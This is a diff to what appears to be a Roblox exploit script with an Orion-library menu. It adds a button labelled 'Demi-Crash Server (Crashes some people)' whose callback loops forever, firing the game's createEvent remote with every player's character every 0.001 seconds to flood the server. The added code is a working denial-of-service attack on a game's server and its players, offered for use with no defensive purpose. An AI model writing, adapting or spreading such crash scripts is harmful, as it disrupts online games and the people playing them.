@@ -362,6 +362,17 @@ game.ReplicatedStorage.eventStorage.createEvent:FireServer(v.Character)
     })
   	end    
 })
+PlayerTab:AddButton({
+	Name = "Demi-Crash Server (Crashes some people)",
+	Callback = function()
+   while true do
+ for i,v in pairs(game.Players:GetChildren()) do
+game.ReplicatedStorage.eventStorage.createEvent:FireServer(v.Character)
+	end
+wait(0.001)
+   end
+  	end    
+})
 
 
 OrionLib:MakeNotification({
